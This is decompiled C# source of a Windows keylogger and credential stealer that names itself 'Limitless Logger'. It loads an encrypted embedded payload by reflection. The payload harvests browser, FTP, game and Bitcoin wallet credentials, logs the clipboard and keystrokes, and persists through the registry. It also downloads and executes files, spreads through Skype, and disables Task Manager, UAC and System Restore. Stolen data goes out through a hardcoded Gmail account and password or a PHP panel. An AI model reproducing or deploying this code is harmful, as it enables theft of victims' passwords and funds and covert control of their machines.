using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace ns1;

internal class Class5
{
	public static byte[] byte_0;

	public static bool bool_0;

	public static bool bool_1;

	public static bool bool_2;

	public static bool bool_3;

	public static bool bool_4;

	public static bool bool_5;

	public static bool bool_6;

	public static bool bool_7;

	public static bool bool_8;

	public static bool bool_9;

	public static bool bool_10;

	public static bool bool_11;

	public static bool bool_12;

	public static bool bool_13;

	public static bool bool_14;

	public static bool bool_15;

	public static bool bool_16;

	public static bool bool_17;

	public static bool bool_18;

	public static bool bool_19;

	public static bool bool_20;

	public static bool bool_21;

	public static bool bool_22;

	public static bool bool_23;

	public static bool bool_24;

	public static bool bool_25;

	public static bool bool_26;

	public static bool bool_27;

	public static bool bool_28;

	public static bool bool_29;

	public static bool bool_30;

	public static bool bool_31;

	public static bool bool_32;

	public static bool bool_33;

	public static bool bool_34;

	public static bool bool_35;

	public static bool bool_36;

	public static bool bool_37;

	public static bool bool_38;

	public static string string_0;

	public static bool bool_39;

	public static int int_0;

	public static bool bool_40;

	public static bool bool_41;

	public static bool bool_42;

	public static System.Timers.Timer timer_0;

	public static string string_1;

	public static string string_2;

	public static string string_3;

	public static Class7 class7_0;

	[STAThread]
	public static void Main()
	{
		try
		{
			byte_0 = smethod_0();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string_0 = Clipboard.GetText();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		if (bool_39)
		{
			try
			{
				Thread.Sleep(5000);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			smethod_15();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		if (bool_5)
		{
			try
			{
				Thread thread = new Thread(smethod_4);
				thread.IsBackground = true;
				thread.Start();
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Thread thread2 = new Thread(smethod_5);
			thread2.IsBackground = true;
			thread2.Start();
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		if (bool_0)
		{
			try
			{
				Thread thread3 = new Thread(smethod_6);
				thread3.IsBackground = true;
				thread3.Start();
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			class7_0 = new Class7();
			Class7.smethod_1();
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			timer_0.Interval = int_0;
			timer_0.Elapsed += smethod_1;
			timer_0.Enabled = true;
			timer_0.Start();
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		if (bool_1)
		{
			try
			{
				Thread thread4 = new Thread(smethod_7);
				thread4.IsBackground = true;
				thread4.Start();
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_2)
		{
			try
			{
				Thread thread5 = new Thread(smethod_8);
				thread5.IsBackground = true;
				thread5.Start();
			}
			catch (Exception projectError11)
			{
				ProjectData.SetProjectError(projectError11);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_3)
		{
			try
			{
				Thread thread6 = new Thread(smethod_9);
				thread6.IsBackground = true;
				thread6.Start();
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Thread thread7 = new Thread(smethod_12);
			thread7.IsBackground = true;
			thread7.Start();
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread8 = new Thread(smethod_13);
			thread8.IsBackground = true;
			thread8.Start();
		}
		catch (Exception projectError14)
		{
			ProjectData.SetProjectError(projectError14);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread9 = new Thread(smethod_11);
			thread9.IsBackground = true;
			thread9.Start();
		}
		catch (Exception projectError15)
		{
			ProjectData.SetProjectError(projectError15);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread thread10 = new Thread(smethod_10);
			thread10.IsBackground = true;
			thread10.Start();
		}
		catch (Exception projectError16)
		{
			ProjectData.SetProjectError(projectError16);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	[SpecialName]
	public static byte[] smethod_0()
	{
		return Encoding.Default.GetBytes(smethod_2(Encoding.Default.GetString(smethod_14("Options_Library.resources")), "OneTwoThreeFourF", "FiveSixSevenEigh"));
	}

	private static void smethod_1(object sender, ElapsedEventArgs e)
	{
		string text = "";
		string text2 = "";
		int num = 0;
		WebClient webClient = new WebClient();
		if (bool_41)
		{
			try
			{
				text = "[:: Clipboard Logger ::]" + Environment.NewLine + Environment.NewLine + string_0 + Environment.NewLine + Environment.NewLine;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			text2 = "[:: User's IP Address ::]\r\n\r\n" + webClient.DownloadString("http://coleak.com/ip/") + "\r\n\r\n";
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_3, "", false) != 0)
			{
				try
				{
					string_2 = string_3 + "\r\n\r\n" + text2 + "\r\n" + text;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				string text3 = "Limitless Logger :: Keystroke Log :: " + ((ServerComputer)Class2.smethod_0()).get_Name() + " :: " + DateTime.Now;
				if (bool_42)
				{
					if (bool_4)
					{
						try
						{
							smethod_3(byte_0, "ClassLibrary1.Functions.Other.PHPPanel", "Upload", new object[5] { "USERNAME", text3, string_2, true, num });
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
					}
					else
					{
						try
						{
							smethod_3(byte_0, "ClassLibrary1.Functions.Other.Mailing", "Email", new object[9] { "mastermusa2013@gmail.com", "rwlzknmqdfdczsqe", "smtp.gmail.com", 587, text3, string_2, true, num, false });
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
					}
				}
				else if (bool_4)
				{
					try
					{
						smethod_3(byte_0, "ClassLibrary1.Functions.Other.PHPPanel", "Upload", new object[5] { "USERNAME", text3, string_2, false, num });
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					try
					{
						smethod_3(byte_0, "ClassLibrary1.Functions.Other.Mailing", "Email", new object[9] { "mastermusa2013@gmail.com", "rwlzknmqdfdczsqe", "smtp.gmail.com", 587, text3, string_2, false, num, false });
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			string_2 = "";
			string_3 = "";
			string_1 = "";
			num++;
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
	}

	public static string smethod_2(string string_4, string string_5, string string_6)
	{
		try
		{
			string strHashName = "SHA1";
			string text = Conversions.ToString(2);
			string s = "1234567890123456";
			int num = 256;
			if (Operators.CompareString(string_4, "", false) == 0)
			{
				return "";
			}
			byte[] bytes = Encoding.ASCII.GetBytes(s);
			byte[] bytes2 = Encoding.ASCII.GetBytes(string_6);
			byte[] array = Convert.FromBase64String(string_4);
			PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(string_5, bytes2, strHashName, Conversions.ToInteger(text));
			byte[] bytes3 = passwordDeriveBytes.GetBytes((int)Math.Round((double)num / 8.0));
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.Mode = CipherMode.CBC;
			byte[] array2 = new byte[array.Length - 1 + 1];
			int count = 0;
			using (ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes3, bytes))
			{
				using MemoryStream memoryStream = new MemoryStream(array);
				using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
				count = cryptoStream.Read(array2, 0, array2.Length);
				memoryStream.Close();
				cryptoStream.Close();
			}
			rijndaelManaged.Clear();
			return Encoding.UTF8.GetString(array2, 0, count);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_3(byte[] byte_1, string string_4, string string_5, object[] object_0)
	{
		try
		{
			object[] array = new object[4] { byte_1, string_4, string_5, object_0 };
			byte[] rawAssembly = (byte[])array[0];
			Assembly assembly = Assembly.Load(rawAssembly);
			Type type = assembly.GetType(Conversions.ToString(array[1]));
			MethodInfo method = type.GetMethod(Conversions.ToString(array[2]));
			return method.Invoke(null, (object[])array[3]);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_4()
	{
		try
		{
			smethod_3(byte_0, "ClassLibrary1.Functions.Other.Extras", "Melt", new object[0]);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_5()
	{
		try
		{
			smethod_3(byte_0, "ClassLibrary1.Functions.Other.Extras", "FolderActions", new object[0]);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_6()
	{
		try
		{
			smethod_3(byte_0, "ClassLibrary1.Functions.Other.Extras", "AddToRegistry", new object[2] { "Codec Reader", "SynMood.exe" });
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_7()
	{
		try
		{
			smethod_3(byte_0, "ClassLibrary1.Functions.Other.Extras", "FakeMessage", new object[3] { "MESSAGE", "TITLE", 12345670 });
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_8()
	{
		try
		{
			smethod_3(byte_0, "ClassLibrary1.Functions.Other.Extras", "DownloadAndExecute", new object[1] { "DLLINK" });
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_9()
	{
		string text = "Limitless Logger :: Run Confirmation :: " + ((ServerComputer)Class2.smethod_0()).get_Name() + " :: " + DateTime.Now;
		string text2 = Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.Other.Extras", "GetComputerInformation", new object[0]));
		string text3 = "Limitless Logger successfully ran on this computer. You should be receiving logs shortly.\r\n\r\n" + text2;
		if (bool_4)
		{
			try
			{
				smethod_3(byte_0, "ClassLibrary1.Functions.Other.PHPPanel", "Upload", new object[5] { "USERNAME", text, text3, true, 1337 });
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		try
		{
			smethod_3(byte_0, "ClassLibrary1.Functions.Other.Mailing", "Email", new object[9] { "mastermusa2013@gmail.com", "rwlzknmqdfdczsqe", "smtp.gmail.com", 587, text, text3, true, 1337, false });
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_10()
	{
		if (bool_13)
		{
			try
			{
				smethod_3(byte_0, "ClassLibrary1.Functions.Other.ClearCookies", "GoogleChrome", new object[0]);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_14)
		{
			try
			{
				smethod_3(byte_0, "ClassLibrary1.Functions.Other.ClearCookies", "MozillaFirefox", new object[0]);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void smethod_11()
	{
		if (bool_34)
		{
			try
			{
				smethod_3(byte_0, "ClassLibrary1.Functions.Other.Extras", "ForceSteamLogin", new object[0]);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_35)
		{
			try
			{
				smethod_3(byte_0, "ClassLibrary1.Functions.Spreading.Skype", "SendMessage", new object[1] { "MASSMESSAGE" });
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_36)
		{
			try
			{
				smethod_3(byte_0, "ClassLibrary1.Functions.Other.Extras", "VisitWebsite", new object[1] { "VISITLINK" });
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void smethod_12()
	{
		if (bool_6)
		{
			try
			{
				smethod_3(byte_0, "ClassLibrary1.Functions.FileRecovery.Programs", "RSBot", new object[0]);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_7)
		{
			try
			{
				smethod_3(byte_0, "ClassLibrary1.Functions.FileRecovery.Programs", "Epicbot", new object[0]);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_8)
		{
			try
			{
				smethod_3(byte_0, "ClassLibrary1.Functions.FileRecovery.Programs", "Rarebot", new object[0]);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_9)
		{
			try
			{
				smethod_3(byte_0, "ClassLibrary1.Functions.FileRecovery.Programs", "Minecraft", new object[0]);
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_10)
		{
			try
			{
				smethod_3(byte_0, "ClassLibrary1.Functions.FileRecovery.Programs", "Bitcoin", new object[0]);
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_11)
		{
			try
			{
				smethod_3(byte_0, "ClassLibrary1.Functions.FileRecovery.Programs", "Spotify", new object[0]);
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_12)
		{
			try
			{
				smethod_3(byte_0, "ClassLibrary1.Functions.FileRecovery.Programs", "Filezilla", new object[0]);
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
		StringBuilder stringBuilder = new StringBuilder();
		if (bool_13)
		{
			try
			{
				stringBuilder.AppendLine(Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.PasswordRecovery.Browsers+GoogleChrome", "GetChrome", new object[0])));
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_14)
		{
			try
			{
				stringBuilder.AppendLine(Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.PasswordRecovery.Browsers+Firefox", "GetChrome", new object[0])));
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_15)
		{
			try
			{
				stringBuilder.AppendLine(Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.PasswordRecovery.Browsers+Safari", "GetSafari", new object[0])));
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_16)
		{
			try
			{
				stringBuilder.AppendLine(Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.PasswordRecovery.Browsers+InternetExplorer", "Refresh", new object[0])));
			}
			catch (Exception projectError11)
			{
				ProjectData.SetProjectError(projectError11);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_17)
		{
			try
			{
				stringBuilder.AppendLine(Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.PasswordRecovery.Browsers+Opera", "GetOpera", new object[0])));
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_18)
		{
			try
			{
				stringBuilder.AppendLine(Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.PasswordRecovery.Programs+InternetDownloadManager", "GetIDM", new object[0])));
			}
			catch (Exception projectError13)
			{
				ProjectData.SetProjectError(projectError13);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_19)
		{
			try
			{
				stringBuilder.AppendLine(Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.PasswordRecovery.Programs+CoreFTP", "GetCoreFTP", new object[0])));
			}
			catch (Exception projectError14)
			{
				ProjectData.SetProjectError(projectError14);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_20)
		{
			try
			{
				stringBuilder.AppendLine(Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.PasswordRecovery.Programs+Nimbuzz", "GetNimbuzz", new object[0])));
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_21)
		{
			try
			{
				stringBuilder.AppendLine(Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.PasswordRecovery.Programs+Pigdin", "GetPigdin", new object[0])));
			}
			catch (Exception projectError16)
			{
				ProjectData.SetProjectError(projectError16);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_22)
		{
			try
			{
				stringBuilder.AppendLine(Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.PasswordRecovery.Programs+SmartFTP", "GetSmartFTP", new object[0])));
			}
			catch (Exception projectError17)
			{
				ProjectData.SetProjectError(projectError17);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_23)
		{
			try
			{
				stringBuilder.AppendLine(Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.PasswordRecovery.Programs+MSN", "GetMSN", new object[0])));
			}
			catch (Exception projectError18)
			{
				ProjectData.SetProjectError(projectError18);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_24)
		{
			try
			{
				stringBuilder.AppendLine(Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.PasswordRecovery.Programs+DynDNS", "GetDynDNS", new object[0])));
			}
			catch (Exception projectError19)
			{
				ProjectData.SetProjectError(projectError19);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_25)
		{
			try
			{
				stringBuilder.AppendLine(Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.PasswordRecovery.Programs+Imvu", "GetImvu", new object[0])));
			}
			catch (Exception projectError20)
			{
				ProjectData.SetProjectError(projectError20);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_26)
		{
			try
			{
				stringBuilder.AppendLine(Conversions.ToString(smethod_3(byte_0, "ClassLibrary1.Functions.PasswordRecovery.Programs+NoIP", "GetNoIP", new object[0])));
			}
			catch (Exception projectError21)
			{
				ProjectData.SetProjectError(projectError21);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(stringBuilder.ToString(), "", false) != 0)
		{
			string text = "Limitless Logger :: Recovery System :: " + ((ServerComputer)Class2.smethod_0()).get_Name() + " :: " + DateTime.Now;
			if (bool_4)
			{
				try
				{
					smethod_3(byte_0, "ClassLibrary1.Functions.Other.PHPPanel", "Upload", new object[5]
					{
						"USERNAME",
						text,
						stringBuilder.ToString(),
						false,
						1337
					});
				}
				catch (Exception projectError22)
				{
					ProjectData.SetProjectError(projectError22);
					ProjectData.ClearProjectError();
				}
			}
			else
			{
				try
				{
					smethod_3(byte_0, "ClassLibrary1.Functions.Other.Mailing", "Email", new object[9]
					{
						"mastermusa2013@gmail.com",
						"rwlzknmqdfdczsqe",
						"smtp.gmail.com",
						587,
						text,
						stringBuilder.ToString(),
						false,
						1337,
						true
					});
				}
				catch (Exception projectError23)
				{
					ProjectData.SetProjectError(projectError23);
					ProjectData.ClearProjectError();
				}
			}
		}
		if (bool_40)
		{
			Environment.Exit(0);
		}
	}

	public static void smethod_13()
	{
		if (bool_27)
		{
			try
			{
				smethod_3(byte_0, Class6.smethod_0("aKysxbdxqa3EpZe5fICKmq6uxq2Urr6Ak5mosMRyaam+s6aRpb4k", "False"), "TaskManager", new object[0]);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_28)
		{
			try
			{
				smethod_3(byte_0, Class6.smethod_0("aKysxbdxqa3EpZe5fICKmq6uxq2Urr6Ak5mosMRyaam+s6aRpb4k", "False"), "Cmd", new object[0]);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_32)
		{
			try
			{
				smethod_3(byte_0, Class6.smethod_0("aKysxbdxqa3EpZe5fICKmq6uxq2Urr6Ak5mosMRyaam+s6aRpb4k", "False"), "Registry", new object[0]);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_29)
		{
			try
			{
				smethod_3(byte_0, Class6.smethod_0("aKysxbdxqa3EpZe5fICKmq6uxq2Urr6Ak5mosMRyaam+s6aRpb4k", "False"), "Uac", new object[0]);
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_31)
		{
			try
			{
				smethod_3(byte_0, Class6.smethod_0("aKysxbdxqa3EpZe5fICKmq6uxq2Urr6Ak5mosMRyaam+s6aRpb4k", "False"), "FolderOptions", new object[0]);
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_30)
		{
			try
			{
				smethod_3(byte_0, Class6.smethod_0("aKysxbdxqa3EpZe5fICKmq6uxq2Urr6Ak5mosMRyaam+s6aRpb4k", "False"), "ControlPanel", new object[0]);
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_33)
		{
			try
			{
				smethod_3(byte_0, Class6.smethod_0("aKysxbdxqa3EpZe5fICKmq6uxq2Urr6Ak5mosMRyaam+s6aRpb4k", "False"), "SystemRestore", new object[0]);
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static byte[] smethod_14(string string_4)
	{
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(string_4);
			byte[] buffer = new byte[(int)(manifestResourceStream.Length - 1L) + 1];
			int count = manifestResourceStream.Read(buffer, 0, (int)manifestResourceStream.Length);
			MemoryStream memoryStream = new MemoryStream(buffer, 0, count);
			return memoryStream.ToArray();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			byte[] result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void smethod_15()
	{
		try
		{
			Mutex mutex = new Mutex(initiallyOwned: false, "BTUSCKV");
			if (!mutex.WaitOne(0, exitContext: false))
			{
				mutex.Close();
				mutex = null;
				Environment.Exit(0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
